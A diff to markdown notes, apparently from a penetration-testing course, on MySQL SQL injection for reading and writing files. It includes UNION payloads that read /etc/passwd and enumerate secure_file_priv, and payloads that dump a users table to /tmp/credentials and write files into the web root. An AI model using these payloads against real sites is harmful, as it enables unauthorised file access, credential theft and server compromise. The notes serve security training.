@@ -398,9 +398,60 @@ We can load a file using the `LOAD_FILE()` function
 ```sql
 SELECT LOAD_FILE('/etc/passwd');
 ```
-:warning: We can only read files if the OS user MySQL is running under, has access to it.
+:warning: We can only read files if the OS user MySQL is running under has access to it.
 
 We can insert this into one of our colums to read a file:
 ```sql
 cn' UNION SELECT 1, LOAD_FILE('/etc/passwd'), 3, 4-- 
+```
+
+# Writing Files
+## Write File Privileges
+1. User with `FILE` privilege enabled
+2. MySQL global `secure_file_priv` variable not enabled
+3. Write access to the location we want to write to on the back-end server.
+
+## `secure_file_priv`
+`secure_file_prive` variable determines where we can read/write files from. If it is not set, we can access the whole file system. If it is set, we can only read/write to that path, if it is `NULL`, we can't read/write to the file system at all.
+
+SQL to enumerate `secure_file_priv`:
+```sql
+SHOW VARIABLES LIKE 'secure_file_priv'
+```
+:warning: You can't use this in a `SELECT` statement.
+
+MySQL global variabls are stored in `information_schema.global_variables` that has 2 columns `variable_name` and `variable_value` which we can access. There are alot of variables in this table, so it is best to use a `WHERE` to filter those results.
+
+Example SQL Query:
+```sql
+SELECT variable_name, variable_value from information_schema.global_variables where variable_name='secure_file_priv';
+```
+
+Example injection using our above DB
+```sql
+cn' UNION select 1, variable_name, variable_value, 4 from information_schema.global_variables where variable_name='secure_file_priv'-- 
+```
+If the value is empty, then we can read the entire file system, as long as the other conditions are true.
+
+## `SELECT INTO OUTFILE`
+We can generally add `INTO OUTFILE ...` to the end of our query to write the results to a file.
+SQL Example:
+```sql
+SELECT * from users INTO OUTFILE '/tmp/credentials';
+# Dumps the Users table into a file at /tmp/credentials
+```
+SQL Example of writing arbitrary strings to a file
+```sql
+select 'this is a test' INTO OUTFILE '/tmp/test.txt';
+```
+> Tip: Advanced file exports utilize the 'FROM_BASE64("base64_data")' function in order to be able to write long/advanced files, including binary data.  
+
+Injection Example writing 'file written successfully' into file /var/www/html/proof.txt
+```sql
+cn' union select 1, "file written successfully", 3, 4 into outfile '/var/www/html/proof.txt'-- 
+# If no errors on the page, your file probably succeeded
+```
+> Note: In the above example, you would have a text file that read "1   file written successfully   3   4" because the other columns would be written to the file as well. You can get around this by using quotes instead of numbers in the other columns, such as
+```sql
+cn' union select "", "file written successfully", "", "" into outfile 'var/www/html/proof.txt'-- 
 ```
